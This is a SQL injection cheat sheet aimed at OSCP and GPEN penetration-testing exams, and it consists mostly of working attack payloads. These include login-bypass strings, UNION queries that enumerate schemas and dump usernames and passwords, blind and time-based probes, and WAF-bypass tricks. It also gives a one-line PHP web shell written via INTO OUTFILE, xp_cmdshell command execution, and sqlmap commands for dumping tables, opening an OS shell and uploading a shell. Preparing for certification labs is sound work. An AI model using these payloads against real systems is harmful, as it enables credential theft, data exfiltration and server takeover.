# SQL Injection Cheat Sheet (OSCP / GPEN)

This cheat sheet provides a **structured workflow for identifying, exploiting, and escalating SQL injection vulnerabilities** during **OSCP and GPEN exams**.

Core methodology:

```
Detect → Confirm → Identify DB Type → Enumerate → Extract Data → Escalate
```

SQL Injection success depends on **understanding the query structure and database behavior**.

---

# 1. Identify Injection Points

Common parameters:

```
?id=
?user=
?page=
?category=
?search=
```

Example:

```
http://target.com/page.php?id=1
```

Test input:

```
'
"
`
```

If error appears:

```
SQL syntax error
```

Possible SQL injection.

---

# 2. Basic SQL Injection Tests

Try:

```
'
''
"
""
```

Check for errors.

---

# 3. Authentication Bypass

Login forms often vulnerable.

Payload:

```
' OR '1'='1
```

Example:

```
username: admin'--
password: anything
```

Other payloads:

```
' OR 1=1--
" OR 1=1--
admin'#
```

---

# 4. Comment Syntax

Different databases use different comment styles.

| Database | Comment |
|--------|--------|
| MySQL | `--` |
| MySQL | `#` |
| SQL Server | `--` |
| Oracle | `--` |

Example:

```
' OR 1=1--
```

---

# 5. Determine Number of Columns

Use ORDER BY:

```
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
```

Error indicates column limit.

---

# 6. UNION-Based Injection

Basic payload:

```
1' UNION SELECT NULL,NULL--
```

Match column count.

Example:

```
1' UNION SELECT NULL,NULL,NULL--
```

---

# 7. Identify Visible Columns

Insert markers:

```
1' UNION SELECT 1,2,3--
```

Check which numbers appear on page.

---

# 8. Database Identification

Retrieve DB version.

### MySQL

```
1' UNION SELECT @@version--
```

### PostgreSQL

```
1' UNION SELECT version()--
```

### SQL Server

```
1' UNION SELECT @@version--
```

### Oracle

```
1' UNION SELECT banner FROM v$version--
```

---

# 9. Database Enumeration

### MySQL

List databases:

```
1' UNION SELECT schema_name FROM information_schema.schemata--
```

---

# 10. Table Enumeration

List tables:

```
1' UNION SELECT table_name FROM information_schema.tables--
```

Specify database:

```
WHERE table_schema='database_name'
```

---

# 11. Column Enumeration

List columns:

```
1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

---

# 12. Dump Data

Extract usernames and passwords:

```
1' UNION SELECT username,password FROM users--
```

---

# 13. Blind SQL Injection

Occurs when no visible output.

Test boolean conditions:

```
1' AND 1=1--
1' AND 1=2--
```

Page behavior changes.

---

# 14. Boolean-Based Blind SQL

Example:

```
1' AND substring(database(),1,1)='a'--
```

Extract data character by character.

---

# 15. Time-Based Blind SQL

Use time delays.

### MySQL

```
1' AND SLEEP(5)--
```

### PostgreSQL

```
1' AND pg_sleep(5)--
```

### SQL Server

```
1'; WAITFOR DELAY '00:00:05'--
```

If response delayed → injection confirmed.

---

# 16. Error-Based SQL Injection

Force database error.

Example (MySQL):

```
1' AND extractvalue(1,concat(0x7e,version()))--
```

Returns DB version.

---

# 17. Out-of-Band SQL Injection

Database interacts with external system.

Example:

```
DNS exfiltration
HTTP callbacks
```

Used when direct output unavailable.

---

# 18. File Read via SQL

### MySQL

```
1' UNION SELECT LOAD_FILE('/etc/passwd')--
```

---

# 19. File Write via SQL

Write web shell.

### MySQL

```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'
```

---

# 20. Command Execution

Some DBs allow command execution.

### SQL Server

Enable xp_cmdshell:

```
EXEC sp_configure 'xp_cmdshell',1
```

Run command:

```
EXEC xp_cmdshell 'whoami'
```

---

# 21. SQLMap Automation

Detect injection:

```bash
sqlmap -u "http://target/page.php?id=1"
```

Enumerate databases:

```bash
sqlmap -u "http://target/page.php?id=1" --dbs
```

List tables:

```bash
sqlmap -u "http://target/page.php?id=1" -D database --tables
```

Dump table:

```bash
sqlmap -u "http://target/page.php?id=1" -D database -T users --dump
```

---

# 22. SQLMap OS Shell

If database allows command execution:

```bash
sqlmap -u "http://target/page.php?id=1" --os-shell
```

---

# 23. SQLMap File Read

```bash
sqlmap -u "http://target/page.php?id=1" --file-read=/etc/passwd
```

---

# 24. SQLMap File Write

Upload web shell:

```bash
sqlmap -u "http://target/page.php?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
```

---

# 25. Database-Specific Payloads

### MySQL

```
@@version
database()
user()
```

### PostgreSQL

```
version()
current_database()
```

### SQL Server

```
@@version
db_name()
```

### Oracle

```
banner FROM v$version
```

---

# 26. Filter Bypass Techniques

Use encoding.

Example:

```
%27 → '
%20 → space
```

Alternative syntax:

```
OR
|| 
AND
&&
```

---

# 27. WAF Bypass

Use:

```
case statements
string concatenation
comments
```

Example:

```
UN/**/ION
```

---

# 28. Important SQL Injection Locations

Look for injection in:

```
GET parameters
POST parameters
cookies
HTTP headers
```

Example:

```
User-Agent
X-Forwarded-For
```

---

# 29. SQL Injection Workflow

```
1. Identify input parameter
2. Test for errors
3. Confirm injection
4. Identify column count
5. Use UNION injection
6. Enumerate database
7. Dump data
8. Escalate to system access
```

---

# 30. Common SQL Injection Vulnerabilities in Exams

Typical OSCP/GPEN vulnerabilities:

```
Login bypass
UNION-based SQLi
Blind SQL injection
File read/write
Command execution via DB
```

---

# 31. Quick SQL Injection Commands

Test injection:

```
'
"
```

Column count:

```
ORDER BY 1--
```

Union test:

```
UNION SELECT NULL,NULL--
```

Automated testing:

```bash
sqlmap -u "http://target/page.php?id=1"
```

---

# 32. Final Advice

SQL injection is about **understanding the query structure**.

Always ask:

```
How many columns exist?
Which column is reflected?
What database is running?
```

Once you answer those questions, **data extraction becomes straightforward**.
